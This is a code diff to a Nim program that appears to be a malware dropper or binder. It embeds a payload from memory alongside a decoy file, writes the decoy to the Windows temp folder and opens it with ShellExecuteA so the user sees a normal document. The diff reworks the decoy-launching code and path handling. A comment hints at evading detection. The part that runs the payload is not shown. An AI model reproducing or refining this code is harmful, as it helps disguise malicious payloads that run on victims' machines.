@@ -3,7 +3,6 @@ import ptr_math
 import strutils
 import os
 import osproc
-import winim/com
 
 var success: BOOL
 
@@ -15,22 +14,31 @@ const toLoadfromMem = slurp(PayloadPath)
 const exeArgs = ""
 
 # Compile-time variable (?) its the content of defined file
-const FileData = readFile(FilePath)
-
+const FileData = slurp(FilePath)
+type
+    HANDLE* = int
+    HWND* = HANDLE
+    LPCSTR* = cstring
+proc ShellExecute(hwnd:HWND, lpOperation:LPCSTR, lpFile:LPCSTR, lpParameters:LPCSTR, lpDirectory:LPCSTR, nShowCmd:int):void {.importc: "ShellExecuteA", stdcall, header:"windows.h".}
 # Get windows temporary folder to place our data, in advanced usage we should avoid this
 # write the file data into temporary file
 var tempPath = getTempDir()
 if not dirExists(tempPath):
     createDir(tempPath)
-var sp = rsplit(FilePath, "/")
+var delimiter = "/"
+if count(FilePath, "\\") > 0:
+    delimiter = "\\"
+var sp = rsplit(FilePath, delimiter)
 writeFile(tempPath&sp[sp.len - 1], FileData)
 
 # Run the file with default app
 proc openEmbed():void {.gcsafe.} = 
-    var splitted = rsplit(FilePath, "/")
+    var delimiter = "/"
+    if count(FilePath, "\\") > 0:
+        delimiter = "\\"
+    var splitted = rsplit(FilePath, delimiter)
     var temp = getTempDir()
-    var WshShell = CreateObject("WScript.Shell")
-    WshShell.run(temp&splitted[splitted.len - 1])
+    ShellExecute(0, "open", temp&splitted[splitted.len - 1], nil, nil, 0)
 
 var thr:Thread[void]
 createThread(thr, openEmbed)
